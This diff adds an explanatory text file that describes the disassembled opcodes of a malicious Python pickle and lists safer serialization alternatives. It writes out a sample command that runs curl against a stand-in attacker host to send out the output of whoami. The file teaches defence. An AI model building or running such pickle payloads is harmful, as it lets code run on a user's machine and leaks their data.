@@ -1,0 +1,22 @@
+# THIS IS A TEXT REPRESENTATION -- not an actual pickle file.
+# A real malicious pickle would contain binary opcodes.
+#
+# What a malicious pickle payload looks like when disassembled:
+#
+#   0: c    GLOBAL 'os system'
+#   1: (    MARK
+#   2: S    STRING 'curl http://evil.example.com/exfil?d=$(whoami)'
+#   3: t    TUPLE
+#   4: R    REDUCE  -- calls os.system() with the argument
+#   5: .    STOP
+#
+# When pickle.load() processes this, it calls:
+#   os.system("curl http://evil.example.com/exfil?d=$(whoami)")
+#
+# The code executes BEFORE the caller receives any object.
+# There is no safe way to inspect a pickle before loading it.
+#
+# Safe alternatives:
+#   - safetensors (for model weights)
+#   - torch.load(..., weights_only=True) (PyTorch 2.0+)
+#   - JSON or Parquet (for structured data)
